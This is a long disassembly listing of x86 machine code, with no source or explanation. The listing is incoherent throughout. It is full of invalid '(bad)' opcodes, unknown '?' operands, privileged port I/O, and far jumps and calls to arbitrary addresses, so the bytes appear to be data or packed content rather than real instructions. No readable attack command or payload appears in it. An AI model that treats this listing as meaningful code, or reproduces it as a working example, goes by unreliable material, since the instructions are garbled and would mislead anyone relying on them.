  4149c2:	cmp    edi,DWORD PTR [esi+0xe]
  4149c5:	sub    al,0x14
  4149c7:	pop    ecx
  4149c8:	loopne 0x4149b8
  4149ca:	push   ebp
  4149cb:	out    dx,al
  4149cc:	sahf   
  4149cd:	outs   dx,DWORD PTR ds:[esi]
  4149ce:	cmp    ecx,DWORD PTR [edx-0x9]
  4149d1:	push   esi
  4149d2:	xchg   ebp,eax
  4149d3:	push   0xf
  4149d5:	nop
  4149d6:	sbb    eax,0xa63182be
  4149db:	add    bh,BYTE PTR [edi]
  4149dd:	(bad)  [esi+0x5d41b21b]
  4149e3:	out    0xfd,eax
  4149e5:	jmp    0x7f7ca21e
  4149ea:	mov    edi,ebx
  4149ec:	stos   BYTE PTR es:[edi],al
  4149ed:	inc    bl
  4149ef:	mov    BYTE PTR [ecx],ah
  4149f1:	ret    
  4149f2:	stos   DWORD PTR es:[edi],eax
  4149f3:	push   es
  4149f4:	mov    dh,0xed
  4149f6:	dec    esi
  4149f7:	sbb    eax,DWORD PTR [edx+0x33]
  4149fa:	inc    BYTE PTR [edi+ebx*8+0x4c]
  4149fe:	bound  ecx,QWORD PTR [ecx]
  414a00:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414a01:	repnz daa 
  414a03:	push   0x75
  414a05:	imul   ebp,DWORD PTR [esi+0x48402306],0x6e7f517b
  414a0f:	jmp    0x9111:0x9728b8ff
  414a16:	cdq    
  414a17:	shl    DWORD PTR [esi],0x25
  414a1a:	retf   0xa591
  414a1d:	repz je 0x4149dc
  414a20:	pop    es
  414a21:	addr16 fxch st(6)
  414a24:	repz jb 0x414a02
  414a27:	mov    ecx,0x17f32481
  414a2c:	imul   ebx,DWORD PTR [ebx],0xfbb68e0d
  414a32:	inc    edi
  414a33:	cmc    
  414a34:	test   DWORD PTR [ebx-0x35a34815],0xe0a879fe
  414a3e:	and    eax,0xee430f28
  414a43:	and    eax,0xd37b8843
  414a48:	or     BYTE PTR [ecx],al
  414a4a:	pop    edx
  414a4b:	push   ds
  414a4c:	popa   
  414a4d:	inc    ebp
  414a4e:	jmp    0x862e:0xbeb993b5
  414a55:	sahf   
  414a56:	add    eax,0x5bf3e45e
  414a5b:	jecxz  0x414ac4
  414a5d:	loopne 0x414acc
  414a5f:	sti    
  414a60:	and    al,0xe2
  414a62:	push   ecx
  414a63:	mov    ds:0xd097863,al
  414a68:	daa    
  414a69:	inc    eax
  414a6a:	nop
  414a6b:	push   0x8798438e
  414a70:	ja     0x414a41
  414a72:	imul   ebp,esi,0x1f
  414a75:	and    eax,0xcca8b79b
  414a7a:	ins    BYTE PTR es:[edi],dx
  414a7b:	fcomp  QWORD PTR [ebx-0x4b]
  414a7e:	push   esi
  414a7f:	scas   eax,DWORD PTR es:[edi]
  414a80:	jmp    0x66a85be3
  414a85:	fstp   DWORD PTR [esi-0x54]
  414a88:	push   esp
  414a89:	add    ch,BYTE PTR [esi+eax*8]
  414a8c:	cwde   
  414a8d:	pop    DWORD PTR [edi]
  414a8f:	mov    bh,0x22
  414a91:	std    
  414a92:	pop    ecx
  414a93:	push   es
  414a94:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414a95:	stos   BYTE PTR es:[edi],al
  414a96:	mov    ?,WORD PTR [ebp-0x3e]
  414a99:	push   ebx
  414a9a:	jmp    0x615fc2e0
  414a9f:	pop    esi
  414aa0:	pop    edi
  414aa1:	xchg   DWORD PTR [edx],ecx
  414aa3:	xchg   eax,ebx
  414aa5:	std    
  414aa6:	frstor [eax-0x2d]
  414aa9:	jmp    FWORD PTR ds:0xd2672050
  414aaf:	cwde   
  414ab0:	outs   dx,BYTE PTR ds:[esi]
  414ab1:	repz div BYTE PTR [edx-0x37]
  414ab5:	jb     0x414a9c
  414ab7:	or     bl,BYTE PTR [ecx+eax*1-0x4ac67c80]
  414abe:	test   DWORD PTR [ebx-0x4cdb7dd1],0x83601f07
  414ac8:	adc    DWORD PTR [ecx+0x7b],edi
  414acb:	fnstsw WORD PTR [edx]
  414acd:	jmp    0x498b:0x98ad1425
  414ad4:	xchg   esp,eax
  414ad5:	mov    dl,0x67
  414ad7:	mov    al,ds:0x98324322
  414adc:	das    
  414add:	jmp    0xe4f9:0xdd551bf6
  414ae4:	ret    
  414ae5:	xchg   edx,eax
  414ae6:	retf   0x2256
  414ae9:	aaa    
  414aea:	push   eax
  414aeb:	jno    0x414b15
  414aed:	jge    0x414aea
  414aef:	out    0x88,al
  414af1:	outs   dx,BYTE PTR ds:[esi]
  414af2:	ds dec esp
  414af4:	cli    
  414af5:	fldenv [esi-0x10]
  414af8:	ins    DWORD PTR es:[edi],dx
  414af9:	fxch   st(5)
  414afb:	dec    esi
  414afc:	and    esp,eax
  414afe:	lock js 0x414ac4
  414b01:	icebp  
  414b02:	sti    
  414b03:	pushf  
  414b04:	add    edx,edx
  414b06:	sbb    eax,ecx
  414b08:	pop    ecx
  414b09:	inc    edx
  414b0a:	cmp    bl,BYTE PTR [edi-0x34]
  414b0d:	xor    BYTE PTR [esi+edx*2+0x7eab4d54],ah
  414b14:	jl     0x414b62
  414b16:	and    DWORD PTR [edi+0x46d8d81f],0x35
  414b1d:	add    al,0x21
  414b1f:	dec    edi
  414b20:	push   ebx
  414b21:	mov    al,ds:0x6e405d89
  414b26:	push   ebp
  414b27:	mov    BYTE PTR [ebp+0x4fe0eeeb],al
  414b2d:	dec    ecx
  414b2e:	push   es
  414b2f:	cmp    dh,bh
  414b31:	xchg   edx,eax
  414b32:	cmp    bh,BYTE PTR [edx]
  414b34:	push   ecx
  414b35:	mov    bh,0x9e
  414b37:	xchg   edx,eax
  414b38:	and    BYTE PTR [edx],dh
  414b3a:	inc    edx
  414b3b:	mov    bl,0xa8
  414b3d:	popf   
  414b3e:	sub    BYTE PTR [eax+0x7e49faa9],al
  414b44:	add    dl,BYTE PTR [ecx+0x3883ce24]
  414b4a:	addr16 test al,0xde
  414b4d:	scas   eax,DWORD PTR es:[edi]
  414b4e:	(bad)  
  414b4f:	scas   eax,DWORD PTR es:[edi]
  414b50:	(bad)  [ebx]
  414b52:	mov    ds:0xbd938f7e,eax
  414b57:	fcomp  st(1)
  414b59:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414b5a:	mov    bh,0x67
  414b5c:	test   ecx,0xa3588bf3
  414b62:	push   eax
  414b63:	fucomp st(7)
  414b65:	sbb    DWORD PTR [ebp-0x2a],0xd
  414b69:	sbb    eax,0xc966d61a
  414b6e:	mov    ?,WORD PTR ds:0x57d4aa8d
  414b74:	and    ecx,edi
  414b76:	pop    ss
  414b77:	loope  0x414bec
  414b79:	or     eax,0x808bd52f
  414b7e:	lds    edx,FWORD PTR [edi+0x56]
  414b81:	fldenv ds:0xcf3890e7
  414b87:	in     al,dx
  414b88:	xchg   esi,eax
  414b89:	fsub   DWORD PTR [edi]
  414b8b:	in     al,dx
  414b8c:	mov    ecx,0x5dc31970
  414b91:	sub    bl,BYTE PTR [edx-0x78a9fb8]
  414b97:	and    cl,bl
  414b99:	js     0x414bbc
  414b9b:	dec    eax
  414b9c:	push   ss
  414b9d:	jne    0x414b36
  414b9f:	jmp    0xc94e:0xbe4ada5e
  414ba6:	(bad)  
  414ba8:	xchg   esi,eax
  414ba9:	adc    ch,bh
  414bab:	mov    edx,0xccce2488
  414bb0:	jmp    FWORD PTR [edi-0x2d]
  414bb3:	push   ebp
  414bb4:	lods   eax,DWORD PTR ds:[esi]
  414bb5:	cmp    BYTE PTR ds:0x99a50974,dl
  414bbb:	xchg   edx,eax
  414bbc:	je     0x414c3b
  414bbe:	add    ebx,DWORD PTR [ebp-0x6dee4537]
  414bc4:	sub    dl,BYTE PTR [edx-0x1c]
  414bc7:	push   0xffffffb5
  414bc9:	shl    ecx,1
  414bcb:	mov    ds:0x5198a83d,eax
  414bd0:	jo     0x414ba9
  414bd2:	sbb    ebp,ebp
  414bd4:	xor    ebp,eax
  414bd6:	test   BYTE PTR [edx],cl
  414bd8:	ins    DWORD PTR es:[edi],dx
  414bd9:	push   edi
  414bda:	jp     0x414b7f
  414bdc:	mov    edx,0x5a5c80ec
  414be1:	push   ecx
  414be2:	mov    ebx,cs
  414be4:	dec    esi
  414be5:	and    dl,ch
  414be7:	retf   
  414be8:	adc    WORD PTR [ebx],bp
  414beb:	dec    DWORD PTR [edx+0x2e]
  414bee:	out    dx,eax
  414bef:	fnstsw WORD PTR [edi]
  414bf1:	daa    
  414bf2:	popf   
  414bf3:	dec    ecx
  414bf4:	sbb    DWORD PTR [ebp-0x6],ecx
  414bf7:	pop    ebp
  414bf9:	call   DWORD PTR [esi]
  414bfb:	xlat   BYTE PTR ds:[ebx]
  414bfc:	div    esp
  414bfe:	jo     0x414bee
  414c00:	jle    0x414c1e
  414c02:	jnp    0x414bf6
  414c04:	xchg   ecx,eax
  414c05:	xchg   esp,eax
  414c06:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414c07:	cmp    esp,ebx
  414c09:	cmp    edi,DWORD PTR [ecx]
  414c0b:	xor    cl,BYTE PTR [ebx]
  414c0d:	ret    0x5e66
  414c10:	adc    al,0x41
  414c12:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414c13:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414c14:	add    eax,0x723967e4
  414c19:	(bad)  
  414c1a:	shl    eax,1
  414c1c:	data16 sahf 
  414c1e:	test   DWORD PTR [ebx-0x3cc3c5e5],0x74ca7299
  414c28:	outs   dx,BYTE PTR ds:[esi]
  414c29:	shl    BYTE PTR [ebp-0x18],1
  414c2c:	jle    0x414c01
  414c2e:	inc    esi
  414c2f:	test   al,0x55
  414c31:	adc    esp,DWORD PTR [ebp+0x77ad1563]
  414c37:	mov    esp,0x9e5c4e2d
  414c3c:	pop    eax
  414c3d:	loopne 0x414bf6
  414c3f:	sbb    eax,0xa4174568
  414c44:	pop    edx
  414c45:	fisttp DWORD PTR [eax]
  414c47:	dec    edi
  414c48:	adc    edx,0xffffffed
  414c4b:	or     eax,0xd840be9d
  414c50:	into   
  414c51:	mov    ds:0xf5af48e1,eax
  414c56:	je     0x414c73
  414c58:	xchg   ecx,eax
  414c59:	fild   WORD PTR [ebp+0x77b5f32b]
  414c5f:	cld    
  414c60:	adc    eax,0xc4344997
  414c65:	sbb    bl,0xa7
  414c68:	pushw  ds
  414c6a:	cmp    edi,DWORD PTR [ecx]
  414c6c:	jecxz  0x414c9b
  414c6e:	lods   al,BYTE PTR ds:[esi]
  414c6f:	(bad)  
  414c70:	test   al,0x4a
  414c72:	lahf   
  414c73:	(bad)  
  414c74:	loop   0x414cf5
  414c76:	add    BYTE PTR [edi+0x33b81167],bl
  414c7c:	shr    BYTE PTR [ebp-0x422aab37],0x2d
  414c83:	cmp    DWORD PTR [eax],eax
  414c85:	fs xchg ecx,eax
  414c87:	dec    esp
  414c88:	mov    esp,0x38fc5c51
  414c8d:	(bad)  
  414c8e:	sahf   
  414c8f:	mov    ss,WORD PTR [esi]
  414c91:	popw   ss
  414c93:	cmp    DWORD PTR [edi],eax
  414c95:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414c96:	int    0xa0
  414c98:	test   al,dl
  414c9a:	lods   al,BYTE PTR ds:[esi]
  414c9b:	rcr    DWORD PTR [ebx],1
  414c9d:	shufps xmm6,XMMWORD PTR [ebx+0x31],0x2e
  414ca2:	lahf   
  414ca3:	xor    DWORD PTR [ebx-0xc],edx
  414ca6:	test   al,0x4a
  414ca8:	in     al,dx
  414ca9:	daa    
  414caa:	push   0xca243033
  414caf:	inc    edx
  414cb0:	fistp  QWORD PTR [eax-0x60]
  414cb3:	ins    DWORD PTR es:[edi],dx
  414cb4:	and    BYTE PTR [edi+ebx*1+0x6b],dl
  414cb8:	pop    esi
  414cb9:	or     eax,0x150d766c
  414cbe:	mov    eax,ds:0xbace44c
  414cc3:	sub    ebp,DWORD PTR [ecx-0x1a1d02ff]
  414cc9:	out    dx,eax
  414cca:	adc    al,0x96
  414ccc:	pop    edi
  414ccd:	mov    dl,BYTE PTR [ebx]
  414ccf:	test   eax,0x89251a51
  414cd4:	jae    0x414c60
  414cd6:	xchg   BYTE PTR [ebx],ah
  414cd8:	loop   0x414d48
  414cda:	hlt    
  414cdb:	mov    WORD PTR [ebp-0x49060136],fs
  414ce1:	int3   
  414ce2:	mov    dh,0x37
  414ce4:	xor    eax,0xc63ef557
  414ce9:	shl    BYTE PTR [esi],1
  414ceb:	rcr    DWORD PTR [esi+0x2646c12],1
  414cf1:	(bad)
  414cf5:	sbb    bl,BYTE PTR [edx+0x46]
  414cf8:	mov    dl,0xce
  414cfa:	aas    
  414cfb:	dec    eax
  414cfc:	repz mov ebp,0x2d7db11e
  414d02:	xchg   ah,bl
  414d04:	(bad)  
  414d05:	adc    dh,BYTE PTR [edx-0x60]
  414d08:	jns    0x414d40
  414d0a:	cmp    ch,BYTE PTR [ebx-0x35]
  414d0d:	xchg   edx,esi
  414d0f:	repnz sbb eax,0x86ae1e12
  414d15:	sahf   
  414d16:	xchg   esi,eax
  414d17:	mov    ecx,0xeb1fe900
  414d1c:	xor    BYTE PTR [ebx+0x71c6eceb],cl
  414d22:	inc    esp
  414d23:	lds    edx,FWORD PTR [esi-0x57]
  414d26:	out    dx,al
  414d27:	inc    ebx
  414d28:	adc    bh,ah
  414d2a:	or     eax,0x15c1ceca
  414d2f:	add    ecx,DWORD PTR [edx]
  414d31:	dec    ebx
  414d32:	(bad)  
  414d34:	mov    ebp,0xa663f30
  414d39:	sar    DWORD PTR [eax],1
  414d3b:	mov    ebp,0x98c279ca
  414d40:	jbe    0x414d14
  414d42:	in     eax,dx
  414d43:	and    al,0xae
  414d45:	sub    al,0x43
  414d47:	inc    edi
  414d48:	jnp    0x414d41
  414d4a:	into   
  414d4b:	push   cs
  414d4c:	mov    bl,0x32
  414d4e:	or     esp,edi
  414d50:	ret    0x25ac
  414d53:	or     BYTE PTR [esp+eax*1],dl
  414d56:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414d57:	mov    BYTE PTR [ebp+0x14],al
  414d5a:	mov    ds,WORD PTR [ebx]
  414d5c:	adc    eax,0xbdb6239d
  414d61:	rcl    al,1
  414d63:	jo     0x414d1f
  414d65:	and    esi,DWORD PTR [edx+0x36f4cacb]
  414d6b:	enter  0xc765,0xf5
  414d6f:	add    eax,0x5c28bccb
  414d74:	jns    0x414d79
  414d76:	xchg   esp,eax
  414d77:	lods   eax,DWORD PTR ds:[esi]
  414d78:	pop    esi
  414d79:	xor    ch,BYTE PTR [ebx+0x4dc631be]
  414d7f:	xchg   DWORD PTR [ecx+0x7c],esp
  414d82:	jge    0x414d6d
  414d84:	jae    0x414d33
  414d86:	xor    BYTE PTR [edi-0x2288059a],0x38
  414d8d:	or     ebx,DWORD PTR [esi]
  414d8f:	add    bl,cl
  414d91:	jbe    0x414df2
  414d93:	das    
  414d94:	lods   ax,WORD PTR ds:[esi]
  414d96:	out    dx,al
  414d97:	add    esi,DWORD PTR [edi]
  414d99:	pop    esp
  414d9a:	stos   BYTE PTR es:[edi],al
  414d9b:	lods   al,BYTE PTR ds:[esi]
  414d9c:	cs or  al,0x99
  414d9f:	jl     0x414de4
  414da1:	xlat   BYTE PTR ds:[ebx]
  414da2:	sub    cl,bh
  414da4:	mov    ecx,0x9bf35420
  414da9:	sbb    edx,DWORD PTR [ebx+eax*1]
  414dac:	sbb    eax,0xab23f071
  414db1:	inc    ebx
  414db2:	lds    esi,FWORD PTR [edx+esi*2]
  414db5:	icebp  
  414db6:	adc    eax,0x65c58342
  414dbb:	das    
  414dbc:	out    dx,al
  414dbd:	mov    WORD PTR [ebx],gs
  414dbf:	or     ebp,ecx
  414dc1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414dc2:	cdq    
  414dc3:	(bad)  
  414dc4:	loopne 0x414d73
  414dc6:	sbb    bh,cl
  414dc8:	cld    
  414dc9:	push   edx
  414dca:	(bad)  
  414dcb:	mov    ah,0x66
  414dcd:	or     al,0x90
  414dcf:	(bad)  
  414dd0:	xor    DWORD PTR [edx-0x6d],esp
  414dd3:	call   0x79c1:0x509d27f6
  414dda:	dec    esi
  414ddb:	jle    0x414e47
  414ddd:	sbb    ebx,DWORD PTR [esi+0x29]
  414de0:	rcr    BYTE PTR [edx],0x88
  414de3:	adc    al,0xe0
  414de5:	mov    esi,0x43689e9a
  414dea:	rcr    BYTE PTR [esp+eax*8],1
  414ded:	mov    al,0x23
  414def:	push   0x609c81aa
  414df4:	out    0x29,eax
  414df6:	stos   BYTE PTR es:[edi],al
  414df7:	sub    al,0x26
  414df9:	push   ebx
  414dfa:	add    eax,0x16d0e9a1
  414dff:	pop    esp
  414e00:	shl    BYTE PTR [ebx],cl
  414e02:	ins    BYTE PTR es:[edi],dx
  414e03:	cli    
  414e04:	jb     0x414e7a
  414e06:	push   ecx
  414e07:	xor    eax,0xc4f84829
  414e0c:	dec    ecx
  414e0d:	xor    al,dl
  414e0f:	cmp    DWORD PTR [esi+0x63241fbd],ebx
  414e15:	ror    DWORD PTR [ecx],0x68
  414e18:	mov    bl,0x11
  414e1a:	push   0x3c
  414e1c:	std    
  414e1d:	pop    ebp
  414e1e:	inc    ebp
  414e1f:	mov    ebp,0xbab6a61a
  414e24:	fcomp  DWORD PTR [ecx]
  414e26:	sub    dh,dl
  414e28:	pop    edi
  414e29:	out    dx,al
  414e2a:	inc    ebx
  414e2b:	jl     0x414ea6
  414e2d:	or     eax,0x573e13a2
  414e32:	push   edx
  414e33:	dec    ecx
  414e34:	iret   
  414e35:	inc    edx
  414e36:	mov    esi,0xc872b5c8
  414e3b:	xlat   BYTE PTR ds:[ebx]
  414e3c:	push   ebx
  414e3d:	jb     0x414e74
  414e3f:	call   0xc531e1ff
  414e44:	lea    ebp,[edx]
  414e46:	mov    dl,0x69
  414e48:	push   ecx
  414e49:	sbb    eax,0xa39bf167
  414e4e:	mov    ds:0xecb6e43e,al
  414e53:	dec    eax
  414e54:	inc    esi
  414e55:	(bad)  
  414e56:	daa    
  414e57:	das    
  414e58:	xor    al,0xdf
  414e5a:	aas    
  414e5b:	sub    eax,0xf4dec66f
  414e60:	jne    0x414e0f
  414e62:	mov    edx,0x7943bff6
  414e67:	and    bh,0x82
  414e6a:	mov    esi,0x9acf0de9
  414e6f:	xchg   edi,eax
  414e70:	xchg   edi,eax
  414e71:	retf   
  414e72:	stos   DWORD PTR es:[edi],eax
  414e73:	mov    bh,BYTE PTR es:[eax+0x266e85ed]
  414e7a:	popa   
  414e7b:	sbb    BYTE PTR [esi+0x63],0xa7
  414e7f:	fidiv  WORD PTR [edx]
  414e81:	dec    edi
  414e82:	fstp   QWORD PTR ds:0x95385d67
  414e88:	iret   
  414e89:	cmc    
  414e8a:	stos   DWORD PTR es:[edi],eax
  414e8b:	sbb    edx,DWORD PTR [esi]
  414e8d:	cmp    dh,BYTE PTR [ebp+0x6a]
  414e90:	fcomp  DWORD PTR [esi]
  414e92:	dec    eax
  414e93:	lock arpl WORD PTR [edi],ax
  414e96:	adc    ecx,DWORD PTR [esi]
  414e98:	mov    ah,0xe3
  414e9a:	adc    esi,0xa0e4f77e
  414ea0:	loop   0x414e66
  414ea2:	xor    eax,0x77a7e032
  414ea7:	icebp  
  414ea8:	enter  0x8ffa,0x8a
  414eac:	cmp    al,0x4c
  414eae:	xchg   ebx,eax
  414eaf:	cwde   
  414eb0:	xor    ah,al
  414eb2:	xchg   edi,eax
  414eb3:	lods   al,BYTE PTR ds:[esi]
  414eb4:	(bad)  
  414eb5:	std    
  414eb6:	xchg   ecx,eax
  414eb7:	jecxz  0x414f01
  414eb9:	sub    al,0x40
  414ebb:	dec    edi
  414ebc:	ds push esp
  414ebe:	clc    
  414ebf:	fistp  WORD PTR [ebp+0x11f103ff]
  414ec5:	mov    bh,0x19
  414ec7:	jle    0x414efc
  414ec9:	(bad)  
  414eca:	push   eax
  414ecb:	lea    edi,[edx-0x1d208dfd]
  414ed1:	sub    al,0xa4
  414ed3:	repnz test eax,0x9e4877fc
  414ed9:	inc    esi
  414eda:	icebp  
  414edb:	in     eax,dx
  414edc:	pop    esp
  414edd:	int3   
  414ede:	imul   esi,DWORD PTR [eax-0x720cd94b],0xffffffc9
  414ee5:	adc    eax,ecx
  414ee7:	inc    eax
  414ee8:	out    dx,eax
  414ee9:	repnz push esi
  414eeb:	cld    
  414eec:	mov    esp,0x4f642c54
  414ef1:	mov    ds:0x29635aae,al
  414ef6:	add    BYTE PTR [ecx-0x259c896e],bh
  414efc:	fcomip st,st(3)
  414efe:	cmp    al,0xde
  414f00:	aaa    
  414f01:	outs   dx,BYTE PTR ds:[esi]
  414f02:	add    al,0xe6
  414f04:	mov    ebx,0x260c9049
  414f09:	gs aam 0xc9
  414f0c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414f0d:	rcl    ebp,cl
  414f0f:	jge    0x414f79
  414f11:	and    DWORD PTR [edi+0x46],eax
  414f14:	hlt    
  414f15:	inc    esp
  414f16:	pop    es
  414f17:	sahf   
  414f18:	imul   eax,DWORD PTR [edx+0xa],0x15
  414f1c:	outs   dx,DWORD PTR ds:[esi]
  414f1e:	rcr    BYTE PTR [edi-0x56b56114],0x9f
  414f25:	sub    al,0x4b
  414f27:	daa    
  414f28:	inc    ecx
  414f29:	sbb    ch,bh
  414f2b:	inc    ebx
  414f2c:	fdivr  QWORD PTR [edx+0x29]
  414f2f:	pop    ss
  414f30:	daa    
  414f31:	add    al,0xf0
  414f33:	and    BYTE PTR [edx],dl
  414f35:	xchg   edi,eax
  414f36:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414f37:	gs mov bh,0x5
  414f3a:	and    ecx,ebp
  414f3c:	mov    ecx,0xe4911c5a
  414f41:	sahf   
  414f42:	sbb    eax,0x5a174251
  414f47:	(bad)  
  414f48:	repnz mov al,ds:0xfda99bd6
  414f4e:	jl     0x414f6b
  414f50:	rcr    DWORD PTR [eax-0x1a],1
  414f53:	adc    edx,DWORD PTR [ebx-0x33]
  414f56:	jmp    0x5a65f185
  414f5b:	enter  0xf45,0x20
  414f5f:	dec    edx
  414f60:	addr16 xor eax,0xb9107d1b
  414f66:	inc    ebx
  414f67:	push   esp
  414f68:	mov    eax,DWORD PTR [esi-0x20]
  414f6b:	nop
  414f6c:	sub    ah,al
  414f6e:	ins    DWORD PTR es:[edi],dx
  414f6f:	pushf  
  414f70:	les    ebx,FWORD PTR [ebx-0x5822da40]
  414f76:	push   eax
  414f77:	sahf   
  414f78:	jbe    0x414f53
  414f7a:	dec    eax
  414f7b:	mov    ecx,0xe99c39b0
  414f80:	add    edx,DWORD PTR [edx+edx*2+0x66]
  414f84:	call   0x7ff50046
  414f89:	outs   dx,DWORD PTR ds:[esi]
  414f8a:	adc    eax,0x972455ef
  414f8f:	pop    esi
  414f90:	sub    edi,DWORD PTR [edi+0x36a0cc69]
  414f96:	sub    ax,0x158f
  414f9a:	dec    BYTE PTR [eax]
  414f9c:	inc    edx
  414f9d:	out    dx,eax
  414f9e:	xchg   DWORD PTR ds:0x30c60fb4,edx
  414fa4:	sti    
  414fa5:	sub    bl,BYTE PTR [edx+0x7e6f16b]
  414fab:	fwait
  414fac:	out    0x57,al
  414fae:	mov    dh,0xa4
  414fb0:	fstp   DWORD PTR ds:0x98d4bcee
  414fb7:	pop    esp
  414fb8:	mov    edi,0xb9154a31
  414fbd:	jb     0x414fa8
  414fbf:	sbb    BYTE PTR [eax],al
  414fc1:	adc    bl,0x8a
  414fc4:	add    BYTE PTR [eax],bl
  414fc6:	xor    DWORD PTR [edx],ebx
  414fc8:	lods   eax,DWORD PTR ds:[esi]
  414fc9:	in     eax,dx
  414fca:	fisubr WORD PTR [esp+edx*2-0x31]
  414fce:	and    al,0xe
  414fd0:	cmp    al,0x8c
  414fd2:	std    
  414fd3:	scas   eax,DWORD PTR es:[edi]
  414fd4:	in     al,0x1f
  414fd6:	int    0x37
  414fd8:	pop    edi
  414fd9:	popf   
  414fda:	xchg   esi,eax
  414fdb:	bound  edx,QWORD PTR [eax+0x1252f324]
  414fe1:	pusha  
  414fe2:	sbb    DWORD PTR [esi],0xffffffa4
  414fe5:	fmul   st,st(6)
  414fe7:	sub    al,0x56
  414fe9:	mov    bh,0x8f
  414feb:	imul   edi,DWORD PTR [esi-0x1e],0xe7722563
  414ff2:	xor    DWORD PTR es:[ecx-0x48337221],esp
  414ff9:	pop    edi
  414ffa:	mov    edi,0xe45e3a3f
  414fff:	out    0x59,al
  415001:	mov    cl,0x95
  415003:	clc    
  415004:	adc    eax,0xb679452a
  415009:	aaa    
  41500a:	mov    dh,0x72
  41500c:	mov    edx,0xd02695ac
  415011:	mov    esi,0x39ca8da5
  415016:	mov    eax,ds:0x922d626d
  41501b:	sub    BYTE PTR [esi],dh
  41501d:	retf   
  41501e:	and    ebp,DWORD PTR [edi-0x31]
  415021:	rcl    BYTE PTR [edx+0x46],cl
  415024:	xchg   esp,eax
  415025:	ins    DWORD PTR es:[edi],dx
  415026:	xor    al,0x76
  415028:	inc    edx
  415029:	pushf  
  41502a:	add    edi,DWORD PTR [ebx+0x41]
  41502d:	das    
  41502e:	in     eax,0x85
  415030:	ss retf 
  415032:	xchg   ebx,eax
  415033:	imul   edx,DWORD PTR [edi-0x7d599afe],0x5d
  41503a:	cld    
  41503b:	aaa    
  41503c:	mov    edx,0x7bfdd357
  415041:	sahf   
  415042:	sbb    eax,0xd86ea578
  415047:	xchg   ebp,eax
  415048:	data16 jg 0x414ff9
  41504b:	cmp    edi,edx
  41504d:	std    
  41504e:	test   DWORD PTR [eax-0x60a1e247],0x7d217508
  415058:	int3   
  415059:	fnsave [eax]
  41505b:	(bad)  
  41505d:	xor    BYTE PTR [eax+ebx*8-0x59],bh
  415061:	fs dec esp
  415063:	sbb    eax,0xd1564004
  415068:	push   eax
  415069:	leave  
  41506a:	fisttp QWORD PTR [edi+ebp*1+0x59]
  41506e:	ins    BYTE PTR es:[edi],dx
  41506f:	jo     0x4150ec
  415071:	pop    ebp
  415072:	xor    al,0x5e
  415074:	stos   BYTE PTR es:[edi],al
  415075:	mov    ss,WORD PTR [edi]
  415077:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415078:	jge    0x415019
  41507a:	mov    edx,0x9a567230
  41507f:	repnz pop ss
  415081:	ss or  ecx,esp
  415084:	inc    esi
  415085:	mov    esp,0x94020079
  41508a:	ja     0x41505c
  41508c:	add    DWORD PTR [esi],esp
  41508e:	test   al,0x1e
  415090:	fimul  WORD PTR [esi]
  415092:	repz pop es
  415094:	jbe    0x415059
  415096:	xchg   edx,eax
  415097:	fldcw  WORD PTR [ebx]
  415099:	sbb    eax,0xb1fb251f
  41509e:	aas    
  41509f:	(bad)  [eax+0x68771556]
  4150a5:	add    DWORD PTR [eax-0x117331c8],ecx
  4150ab:	popa   
  4150ac:	inc    ebx
  4150ad:	sbb    ebx,DWORD PTR [eax-0x2ce64161]
  4150b3:	sub    DWORD PTR [edi],ecx
  4150b5:	in     al,0x53
  4150b7:	mov    bl,0x96
  4150b9:	sub    esp,DWORD PTR [esi]
  4150bb:	xchg   edx,ebx
  4150bd:	(bad)  
  4150bf:	popf   
  4150c0:	xor    edx,edi
  4150c2:	sbb    ecx,DWORD PTR ds:0x4f0d371c
  4150c8:	ins    DWORD PTR es:[edi],dx
  4150c9:	(bad)  
  4150cb:	xor    eax,0xffffffed
  4150ce:	(bad)  
  4150cf:	fnstsw WORD PTR [ebx-0x49]
  4150d2:	sbb    al,0x52
  4150d4:	jmp    0xa5e3acdd
  4150d9:	in     al,dx
  4150da:	(bad)  
  4150db:	int    0x7c
  4150dd:	dec    ebp
  4150de:	rol    esi,1
  4150e0:	loope  0x415154
  4150e2:	cmp    bh,BYTE PTR [ebp-0x2b]
  4150e5:	push   ecx
  4150e6:	pusha  
  4150e7:	shr    DWORD PTR [edx],0x85
  4150ea:	lods   eax,DWORD PTR ds:[esi]
  4150eb:	jb     0x41514c
  4150ed:	dec    ecx
  4150ee:	adc    BYTE PTR ds:0x8c934d35,0xb
  4150f5:	mov    esp,DWORD PTR [ecx+0x1e74c13b]
  4150fb:	jp     0x4150b6
  4150fd:	push   esp
  4150fe:	adc    eax,DWORD PTR [eax-0xa]
  415101:	(bad)  
  415102:	in     eax,dx
  415103:	jae    0x4150ad
  415105:	mov    edx,0x39398181
  41510a:	jg     0x415155
  41510c:	mov    DWORD PTR [eax-0x52fb31a4],edi
  415112:	call   0xd152:0x7c199676
  415119:	cmp    DWORD PTR [ecx],0x39f3f880
  41511f:	sbb    al,BYTE PTR [esi+esi*8-0x21ed513b]
  415126:	imul   ebp,DWORD PTR [ecx],0x2d
  415129:	(bad)  
  41512a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41512b:	icebp  
  41512c:	add    BYTE PTR [esi-0x7615b4ca],dl
  415132:	outs   dx,BYTE PTR ds:[esi]
  415133:	hlt    
  415134:	mov    cl,0x5a
  415136:	xchg   BYTE PTR [ebp-0x9],bh
  415139:	outs   dx,BYTE PTR ds:[esi]
  41513a:	sub    dl,ch
  41513c:	pusha  
  41513d:	outs   dx,DWORD PTR ds:[esi]
  41513e:	ins    DWORD PTR es:[edi],dx
  41513f:	dec    esi
  415140:	int    0xe8
  415142:	push   ss
  415143:	hlt    
  415144:	std    
  415145:	fdiv   QWORD PTR [edi]
  415147:	mov    ecx,0x23000197
  41514c:	(bad)  
  41514d:	mov    ds:0xbe7fe98e,eax
  415152:	mov    cl,0x65
  415154:	(bad)  
  415155:	in     al,0x37
  415157:	pop    ss
  415158:	mov    WORD PTR [edx+0x58f97fdf],?
